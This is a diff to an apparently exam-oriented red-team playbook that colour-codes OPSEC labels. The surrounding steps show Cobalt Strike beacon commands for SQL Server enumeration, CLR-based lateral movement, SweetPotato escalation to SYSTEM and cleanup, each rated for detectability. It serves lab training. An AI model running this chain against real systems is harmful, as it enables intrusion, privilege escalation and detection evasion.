@@ -58,11 +58,11 @@ Loaded script `C:\Tools\SQL-BOF\SQL\SQL.cna`
 ### Step 1 — Situational Awareness on mssql_svc Beacon
 
 ```cs
-beacon> getuid                        // OPSEC-SAFE — built-in, no child process
-beacon> process_browser               // OPSEC-SAFE — built-in GUI tab, no child process
+beacon> getuid                        // OPSEC-🟢SAFE — built-in, no child process
+beacon> process_browser               // OPSEC-🟢SAFE — built-in GUI tab, no child process
 
 // Check for SeImpersonatePrivilege — present on SQL service accounts
-beacon> powerpick whoami /priv        // OPSEC-CAUTION — fork & run (spawns spawnto process)
+beacon> powerpick whoami /priv        // OPSEC-🟠CAUTION — fork & run (spawns spawnto process)
 ```
 
 > **SeImpersonatePrivilege present?** SQL service accounts run as a service identity and almost always have `SeImpersonatePrivilege`. This opens the SweetPotato privilege escalation path directly to SYSTEM without needing a separate service registry exploit.
@@ -70,10 +70,10 @@ beacon> powerpick whoami /priv        // OPSEC-CAUTION — fork & run (spawns sp
 ### Step 2 — File System Enumeration
 
 ```cs
-beacon> file_browser                                          // OPSEC-SAFE — built-in GUI, no child process
-beacon> ls C:\Users\mssql_svc\Desktop                        // OPSEC-SAFE — built-in beacon command
-beacon> ls C:\Users\mssql_svc\Documents                      // OPSEC-SAFE — built-in beacon command
-beacon> ls "C:\Program Files\Microsoft SQL Server"           // OPSEC-SAFE — built-in beacon command
+beacon> file_browser                                         // OPSEC-🟢SAFE — built-in GUI, no child process
+beacon> ls C:\Users\mssql_svc\Desktop                        // OPSEC-🟢SAFE — built-in beacon command
+beacon> ls C:\Users\mssql_svc\Documents                      // OPSEC-🟢SAFE — built-in beacon command
+beacon> ls "C:\Program Files\Microsoft SQL Server"           // OPSEC-🟢SAFE — built-in beacon command
 ```
 
 ### Step 3 — [EXAM DAY] SQL Server Enumeration
@@ -81,25 +81,25 @@ beacon> ls "C:\Program Files\Microsoft SQL Server"           // OPSEC-SAFE — b
 ```cs
 // Enumerate SQL instances via LDAP SPN query
 beacon> ldapsearch (&(samAccountType=805306368)(servicePrincipalName=MSSQLSvc*)) --attributes name,samAccountName,servicePrincipalName
-//                                                            // OPSEC-SAFE — BOF, runs in beacon thread
+//                                                            // OPSEC-🟢SAFE — BOF, runs in beacon thread
 
-beacon> sql-info lon-db-1                                     // OPSEC-SAFE — SQL BOF, no child process
-beacon> sql-whoami lon-db-1                                   // OPSEC-SAFE — SQL BOF, no child process
+beacon> sql-info lon-db-1                                     // OPSEC-🟢SAFE — SQL BOF, no child process
+beacon> sql-whoami lon-db-1                                   // OPSEC-🟢SAFE — SQL BOF, no child process
 
 // If not sysadmin — check linked servers
-beacon> sql-links lon-db-1                                    // OPSEC-SAFE — SQL BOF, no child process
+beacon> sql-links lon-db-1                                    // OPSEC-🟢SAFE — SQL BOF, no child process
 ```
 
 ### Step 4 — [EXAM DAY] SQL CLR Payload for Lateral Movement
 
 ```cs
-beacon> sql-whoami lon-db-1                                   // OPSEC-SAFE — confirm sysadmin before proceeding
+beacon> sql-whoami lon-db-1                                   // OPSEC-🟢SAFE — confirm sysadmin before proceeding
 
-beacon> sql-enableclr lon-db-1                                // OPSEC-CAUTION — modifies SQL server config (sp_configure change, detectable in SQL audit log)
+beacon> sql-enableclr lon-db-1                                // OPSEC-🟠CAUTION — modifies SQL server config (sp_configure change, detectable in SQL audit log)
 beacon> sql-clr lon-db-1 C:\Users\Attacker\source\repos\MyProcedure\bin\Release\MyProcedure.dll MyProcedure
-//                                                            // OPSEC-CAUTION — loads CLR assembly into SQL, visible in sys.assemblies
+//                                                            // OPSEC-🟠CAUTION — loads CLR assembly into SQL, visible in sys.assemblies
 
-beacon> link lon-db-1 <SMB-PIPENAME>                          // OPSEC-SAFE — connects to waiting SMB beacon, no new process
+beacon> link lon-db-1 <SMB-PIPENAME>                          // OPSEC-🟢SAFE — connects to waiting SMB beacon, no new process
 ```
 
 ### Step 5 — [EXAM DAY] Privilege Escalation via SeImpersonatePrivilege
@@ -107,14 +107,14 @@ beacon> link lon-db-1 <SMB-PIPENAME>                          // OPSEC-SAFE — 
 ```cs
 // SweetPotato — payload must be pre-staged on the SQL host as tcp-local EXE
 beacon> execute-assembly C:\Tools\SweetPotato\bin\Release\SweetPotato.exe -p "C:\Windows\ServiceProfiles\MSSQLSERVER\AppData\Local\Microsoft\WindowsApps\tcp-local_x64.exe"
-//                                                            // OPSEC-CAUTION — fork & run (execute-assembly spawns spawnto process)
-beacon> connect localhost 1337                                // OPSEC-SAFE — links to SYSTEM beacon over TCP, no new process
+//                                                            // OPSEC-🟠CAUTION — fork & run (execute-assembly spawns spawnto process)
+beacon> connect localhost 1337                                // OPSEC-🟢SAFE — links to SYSTEM beacon over TCP, no new process
 ```
 
 ### Step 6 — [EXAM DAY] Cleanup SQL CLR
 
 ```cs
-beacon> sql-disableclr lon-db-1                               // OPSEC-CAUTION — reverts sp_configure change, logged in SQL audit
+beacon> sql-disableclr lon-db-1                               // OPSEC-🟠CAUTION — reverts sp_configure change, logged in SQL audit
 ```
 
 ### Decision Flow — What to Do After mssql_svc Beacon
